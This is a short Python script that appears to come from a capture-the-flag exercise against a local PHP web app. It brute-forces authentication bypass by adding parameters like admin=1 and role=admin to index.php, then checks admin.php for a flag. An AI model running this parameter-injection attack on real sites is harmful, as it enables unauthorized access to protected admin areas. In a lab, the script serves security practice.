import requests
import re

url = "http://127.0.0.1:33107"

def test_auth_bypass(var_name, var_value):
    session = requests.Session()
    
    # Inject via category parameter
    inject_url = f"{url}/index.php?category=secret&{var_name}={var_value}"
    inject_resp = session.get(inject_url, timeout=10)
    print(f"Inject {var_name}={var_value}: status={inject_resp.status_code}")
    
    # Try to access admin
    admin_url = f"{url}/admin.php"
    admin_resp = session.get(admin_url, timeout=10)
    print(f"Admin access: status={admin_resp.status_code}, length={len(admin_resp.text)}")
    
    # Check for flag
    flag_match = re.search(r'FLAG\{[^}]+\}', admin_resp.text, re.I)
    if flag_match:
        print(f"FLAG FOUND: {flag_match.group()}")
        return True
    
    # Show first 200 chars if admin page accessible
    if admin_resp.status_code == 200:
        print(f"Admin preview: {admin_resp.text[:200]}")
        
    return False

# Test common auth variables
test_vars = [
    ('admin', 1), ('is_admin', 'true'), ('logged_in', 1), 
    ('user', 'admin'), ('username', 'admin'), ('user_type', 'admin'),
    ('auth', 1), ('authorized', 1), ('authenticated', 1), ('role', 'admin')
]

print("Starting auth bypass tests...")
for var_name, var_value in test_vars:
    success = test_auth_bypass(var_name, var_value)
    if success:
        break

print("All tests completed.")
